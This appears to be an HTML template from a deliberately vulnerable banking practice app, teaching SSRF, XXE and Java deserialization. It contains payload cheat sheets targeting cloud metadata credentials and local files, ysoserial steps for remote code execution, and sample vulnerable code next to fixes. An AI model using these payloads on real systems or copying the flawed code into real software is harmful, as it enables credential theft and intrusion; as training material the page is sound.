@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FinVault — Document Manager</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="/css/style.css" rel="stylesheet">
+</head>
+<body class="app-body">
+
+<nav th:replace="~{fragments/navbar :: navbar}"></nav>
+
+<div class="container-fluid py-4">
+
+    <!-- Tab navigation for vulnerabilities -->
+    <ul class="nav nav-tabs nav-tabs-vuln mb-4" id="docTabs">
+        <li class="nav-item">
+            <a class="nav-link active" data-bs-toggle="tab" href="#tab-ssrf">
+                <i class="bi bi-bug-fill text-danger me-1"></i>
+                <strong>Vuln #4:</strong> SSRF — Fetch URL
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#tab-xxe">
+                <i class="bi bi-bug-fill text-warning me-1"></i>
+                <strong>Vuln #5:</strong> XXE — XML Upload
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#tab-deser">
+                <i class="bi bi-bug-fill text-danger me-1"></i>
+                <strong>Vuln #6:</strong> Insecure Deserialization
+            </a>
+        </li>
+    </ul>
+
+    <div class="tab-content">
+
+        <!-- ================================================================
+             TAB 1: SSRF
+             ================================================================ -->
+        <div class="tab-pane fade show active" id="tab-ssrf">
+            <div class="vuln-badge mb-4">
+                <i class="bi bi-bug-fill me-2"></i>
+                <strong>VULNERABILITY #4: Server-Side Request Forgery (SSRF)</strong> —
+                The server fetches any URL you provide with no validation. Use it to reach
+                internal services, cloud metadata endpoints, or local-only admin APIs.
+            </div>
+
+            <div class="row g-4">
+                <div class="col-lg-7">
+                    <div class="app-card">
+                        <div class="app-card-header">
+                            <h5 class="mb-0"><i class="bi bi-cloud-download text-gold me-2"></i>Financial Document Import</h5>
+                            <p class="text-muted small mb-0">Import a financial document from a remote URL</p>
+                        </div>
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label class="form-label text-light">Document URL</label>
+                                <input type="text" class="form-control bg-dark text-light border-secondary"
+                                       id="ssrfUrl"
+                                       value="http://localhost:8080/internal/admin-data"
+                                       placeholder="https://example.com/document.pdf">
+                                <div class="form-text text-warning">
+                                    <i class="bi bi-exclamation-triangle"></i>
+                                    The server fetches this URL. Try internal endpoints!
+                                </div>
+                            </div>
+                            <button class="btn btn-gold" onclick="fetchDocument()">
+                                <i class="bi bi-cloud-download me-2"></i>Fetch Document
+                            </button>
+
+                            <div id="ssrfResult" class="mt-4 d-none">
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span class="text-gold fw-bold small">Server Response</span>
+                                    <span id="ssrfStatus" class="badge bg-success">200 OK</span>
+                                </div>
+                                <pre id="ssrfResponseBody" class="api-response text-light small"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-5">
+                    <div class="app-card mb-3">
+                        <div class="app-card-header">
+                            <h5 class="mb-0 text-gold"><i class="bi bi-journal-code me-2"></i>SSRF Target Cheatsheet</h5>
+                        </div>
+                        <div class="card-body">
+                            <div class="payload-item" onclick="useSSRF(this)">
+                                <div class="payload-label text-danger">Internal Admin API</div>
+                                <code>http://localhost:8080/internal/admin-data</code>
+                                <p class="text-muted small mb-0 mt-1">Returns all credentials, DB passwords, user data</p>
+                            </div>
+                            <div class="payload-item" onclick="useSSRF(this)">
+                                <div class="payload-label">H2 Console</div>
+                                <code>http://localhost:8080/h2-console</code>
+                            </div>
+                            <div class="payload-item" onclick="useSSRF(this)">
+                                <div class="payload-label">AWS Metadata</div>
+                                <code>http://169.254.169.254/latest/meta-data/</code>
+                            </div>
+                            <div class="payload-item" onclick="useSSRF(this)">
+                                <div class="payload-label">AWS IAM Credentials</div>
+                                <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+                            </div>
+                            <div class="payload-item" onclick="useSSRF(this)">
+                                <div class="payload-label">GCP Metadata</div>
+                                <code>http://metadata.google.internal/computeMetadata/v1/</code>
+                            </div>
+                            <div class="payload-item" onclick="useSSRF(this)">
+                                <div class="payload-label">Localhost scan</div>
+                                <code>http://127.0.0.1:8080/internal/admin-data</code>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="app-card">
+                        <div class="app-card-header">
+                            <h5 class="mb-0"><i class="bi bi-code-slash text-gold me-2"></i>Vulnerable Code</h5>
+                        </div>
+                        <div class="card-body">
+                            <pre class="text-warning small mb-0"><code>// No SSRF protection!
+URL url = new URL(userSuppliedUrl);
+HttpURLConnection conn =
+  (HttpURLConnection) url.openConnection();
+// Fetches ANY URL including internal ones</code></pre>
+                            <hr class="border-secondary">
+                            <p class="text-muted small mb-0">Fix: Use an allowlist of permitted domains/IPs. Block 169.254.x.x, 10.x.x.x, 172.16.x.x, 192.168.x.x, and localhost.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================================================================
+             TAB 2: XXE
+             ================================================================ -->
+        <div class="tab-pane fade" id="tab-xxe">
+            <div class="vuln-badge mb-4">
+                <i class="bi bi-bug-fill me-2"></i>
+                <strong>VULNERABILITY #5: XML External Entity (XXE) Injection</strong> —
+                XML files are parsed with external entity processing enabled.
+                Upload a crafted XML file to read local files from the server.
+            </div>
+
+            <div class="row g-4">
+                <div class="col-lg-7">
+                    <div class="app-card">
+                        <div class="app-card-header">
+                            <h5 class="mb-0"><i class="bi bi-file-earmark-code text-gold me-2"></i>Upload Financial Statement (XML)</h5>
+                            <p class="text-muted small mb-0">Upload an XML financial document for processing</p>
+                        </div>
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label class="form-label text-light">Select XML File</label>
+                                <input type="file" class="form-control bg-dark text-light border-secondary"
+                                       id="xmlFile" accept=".xml">
+                            </div>
+
+                            <div class="mb-3">
+                                <label class="form-label text-muted small">Or paste XML directly:</label>
+                                <textarea class="form-control bg-dark text-light border-secondary font-monospace small"
+                                          id="xmlContent" rows="8"
+                                          placeholder="Paste XXE payload XML here..."><?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<statement>
+  <account>ACC-00142</account>
+  <data>&amp;xxe;</data>
+</statement></textarea>
+                                <div class="form-text text-warning">
+                                    <i class="bi bi-exclamation-triangle"></i>
+                                    Use <code>&amp;xxe;</code> in the XML — it will be resolved to the file contents.
+                                </div>
+                            </div>
+
+                            <div class="d-flex gap-2">
+                                <button class="btn btn-gold" onclick="uploadXml()">
+                                    <i class="bi bi-upload me-2"></i>Upload &amp; Parse
+                                </button>
+                                <button class="btn btn-outline-warning" onclick="loadXxxPayload()">
+                                    <i class="bi bi-bug me-2"></i>Load XXE Payload
+                                </button>
+                            </div>
+
+                            <div id="xxeResult" class="mt-4 d-none">
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span class="text-gold fw-bold small">Parsed XML Response (File Contents Visible)</span>
+                                    <span id="xxeStatus" class="badge bg-success">Parsed</span>
+                                </div>
+                                <pre id="xxeResponseBody" class="api-response text-light small"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-5">
+                    <div class="app-card mb-3">
+                        <div class="app-card-header">
+                            <h5 class="mb-0 text-gold"><i class="bi bi-journal-code me-2"></i>XXE Payload Cheatsheet</h5>
+                        </div>
+                        <div class="card-body">
+                            <p class="text-muted small mb-3">Click a payload to load it into the editor:</p>
+
+                            <div class="payload-item" onclick="loadPayload('etc-passwd')">
+                                <div class="payload-label text-danger">Read /etc/passwd</div>
+                                <code>file:///etc/passwd</code>
+                            </div>
+                            <div class="payload-item" onclick="loadPayload('etc-hosts')">
+                                <div class="payload-label">Read /etc/hosts</div>
+                                <code>file:///etc/hosts</code>
+                            </div>
+                            <div class="payload-item" onclick="loadPayload('proc-self')">
+                                <div class="payload-label">Process environment</div>
+                                <code>file:///proc/self/environ</code>
+                            </div>
+                            <div class="payload-item" onclick="loadPayload('app-props')">
+                                <div class="payload-label">App config (credentials)</div>
+                                <code>file:///app/application.properties</code>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="app-card">
+                        <div class="app-card-header">
+                            <h5 class="mb-0"><i class="bi bi-code-slash text-gold me-2"></i>Vulnerable Code</h5>
+                        </div>
+                        <div class="card-body">
+                            <pre class="text-warning small mb-0"><code>DocumentBuilderFactory dbf =
+  DocumentBuilderFactory.newInstance();
+// Missing security features:
+// dbf.setFeature(
+//   "http://apache.org/xml/features/
+//    disallow-doctype-decl", true);
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(inputStream);
+// ↑ Resolves external entities!</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================================================================
+             TAB 3: INSECURE DESERIALIZATION
+             ================================================================ -->
+        <div class="tab-pane fade" id="tab-deser">
+            <div class="vuln-badge mb-4">
+                <i class="bi bi-bug-fill me-2"></i>
+                <strong>VULNERABILITY #6: Insecure Deserialization</strong> —
+                The <code>/api/restore-session</code> endpoint deserializes Base64-encoded Java objects
+                with no filtering. With <code>commons-collections:3.2.1</code> on the classpath,
+                ysoserial gadget chains achieve Remote Code Execution.
+            </div>
+
+            <div class="row g-4">
+                <div class="col-lg-7">
+                    <div class="app-card">
+                        <div class="app-card-header">
+                            <h5 class="mb-0"><i class="bi bi-key text-gold me-2"></i>Session Restore</h5>
+                            <p class="text-muted small mb-0">Restore a saved session from a serialized token</p>
+                        </div>
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label class="form-label text-light">Session Token (Base64-encoded serialized object)</label>
+                                <textarea class="form-control bg-dark text-light border-secondary font-monospace small"
+                                          id="sessionData" rows="4"
+                                          placeholder="Paste Base64-encoded Java serialized object...
+Example: rO0AB... (ysoserial output piped through base64)"></textarea>
+                                <div class="form-text text-warning">
+                                    <i class="bi bi-exclamation-triangle"></i>
+                                    Generate payload: <code>java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64</code>
+                                </div>
+                            </div>
+
+                            <div class="d-flex gap-2 mb-4">
+                                <button class="btn btn-gold" onclick="restoreSession()">
+                                    <i class="bi bi-arrow-clockwise me-2"></i>Restore Session
+                                </button>
+                                <button class="btn btn-outline-warning" onclick="loadSamplePayload()">
+                                    <i class="bi bi-bug me-2"></i>Load Benign Sample
+                                </button>
+                            </div>
+
+                            <div id="deserResult" class="d-none">
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span class="text-gold fw-bold small">Server Response</span>
+                                </div>
+                                <pre id="deserResponseBody" class="api-response text-light small"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-5">
+                    <div class="app-card mb-3">
+                        <div class="app-card-header">
+                            <h5 class="mb-0 text-gold"><i class="bi bi-terminal me-2"></i>Exploitation Steps</h5>
+                        </div>
+                        <div class="card-body">
+                            <ol class="text-muted small ps-3">
+                                <li class="mb-2">Download <a href="https://github.com/frohoff/ysoserial/releases" class="text-gold" target="_blank">ysoserial.jar</a></li>
+                                <li class="mb-2">Generate a payload:
+                                    <pre class="text-warning mt-1 small"><code>java -jar ysoserial.jar \
+  CommonsCollections1 \
+  "touch /tmp/pwned" \
+  | base64 -w0</code></pre>
+                                </li>
+                                <li class="mb-2">Paste the Base64 output into the Session Token field</li>
+                                <li class="mb-2">Click "Restore Session" — the server deserializes it and executes your command</li>
+                                <li>Verify: <code>ls /tmp/pwned</code></li>
+                            </ol>
+                        </div>
+                    </div>
+
+                    <div class="app-card">
+                        <div class="app-card-header">
+                            <h5 class="mb-0"><i class="bi bi-code-slash text-gold me-2"></i>Vulnerable Code</h5>
+                        </div>
+                        <div class="card-body">
+                            <pre class="text-warning small mb-0"><code>byte[] data =
+  Base64.getDecoder().decode(base64);
+ObjectInputStream ois =
+  new ObjectInputStream(
+    new ByteArrayInputStream(data));
+// No filtering! RCE via ysoserial:
+Object obj = ois.readObject();</code></pre>
+                            <hr class="border-secondary">
+                            <p class="text-muted small mb-0">Fix: Use <code>ObjectInputFilter</code> to allowlist safe classes. Better: avoid Java serialization entirely; use JSON.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div><!-- /tab-content -->
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // SSRF
+    function fetchDocument() {
+        const url = document.getElementById('ssrfUrl').value;
+        fetch('/documents/fetch', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'url=' + encodeURIComponent(url)
+        })
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('ssrfResult').classList.remove('d-none');
+            document.getElementById('ssrfResponseBody').textContent = JSON.stringify(data, null, 2);
+            const statusEl = document.getElementById('ssrfStatus');
+            statusEl.textContent = data.statusCode ? data.statusCode + ' OK' : (data.success ? 'Success' : 'Error');
+            statusEl.className = 'badge ' + (data.success ? 'bg-success' : 'bg-danger');
+        });
+    }
+
+    function useSSRF(el) {
+        document.getElementById('ssrfUrl').value = el.querySelector('code').textContent;
+    }
+
+    // XXE
+    function uploadXml() {
+        const content = document.getElementById('xmlContent').value;
+        const blob = new Blob([content], {type: 'text/xml'});
+        const formData = new FormData();
+        formData.append('file', blob, 'statement.xml');
+
+        fetch('/documents/upload-xml', {method: 'POST', body: formData})
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('xxeResult').classList.remove('d-none');
+            document.getElementById('xxeResponseBody').textContent = JSON.stringify(data, null, 2);
+            const st = document.getElementById('xxeStatus');
+            st.textContent = data.success ? 'Parsed Successfully' : 'Parse Error';
+            st.className = 'badge ' + (data.success ? 'bg-success' : 'bg-warning text-dark');
+        });
+    }
+
+    function loadPayload(type) {
+        const payloads = {
+            'etc-passwd': `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<statement>\n  <account>ACC-00142</account>\n  <data>&xxe;</data>\n</statement>`,
+            'etc-hosts':  `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/hosts">\n]>\n<statement>\n  <data>&xxe;</data>\n</statement>`,
+            'proc-self':  `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///proc/self/environ">\n]>\n<statement>\n  <data>&xxe;</data>\n</statement>`,
+            'app-props':  `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///app/application.properties">\n]>\n<statement>\n  <data>&xxe;</data>\n</statement>`
+        };
+        document.getElementById('xmlContent').value = payloads[type] || '';
+    }
+
+    function loadXxxPayload() { loadPayload('etc-passwd'); }
+
+    // Deserialization
+    function restoreSession() {
+        const sessionData = document.getElementById('sessionData').value.trim();
+        fetch('/api/restore-session', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({sessionData})
+        })
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('deserResult').classList.remove('d-none');
+            document.getElementById('deserResponseBody').textContent = JSON.stringify(data, null, 2);
+        });
+    }
+
+    function loadSamplePayload() {
+        // A harmless serialized Java HashMap (base64) — just to test the endpoint responds
+        document.getElementById('sessionData').value =
+            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAEAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAABF0AANrZXlxAH4ABXg=';
+    }
+</script>
+</body>
+</html>
